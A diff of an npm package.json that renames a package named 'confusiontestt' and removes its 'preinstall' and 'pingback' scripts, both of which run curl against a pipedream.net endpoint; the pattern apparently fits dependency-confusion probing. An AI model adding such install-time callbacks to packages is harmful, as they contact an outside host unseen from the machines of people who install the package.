@@ -1,13 +1,19 @@
 {
-  "name": "confusiontestt",
-  "version": "1.0.0",
+  "name": "docs-component-titlen",
+  "version": "1.1.1",
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "curl https://eo536ohsnextro9.m.pipedream.net",
-    "pingback": "curl https://eo536ohsnextro9.m.pipedream.net"  
+    "start": "node index.js"
   },
-  "author": "",
-  "license": "ISC"
+  "keywords": [
+    "package",
+    "exemple",
+    "npm"
+  ],
+  "author": "_Xml_",
+  "license": "MIT",
+  "dependencies": {
+    "axios": "^0.21.1"
+  }
 }
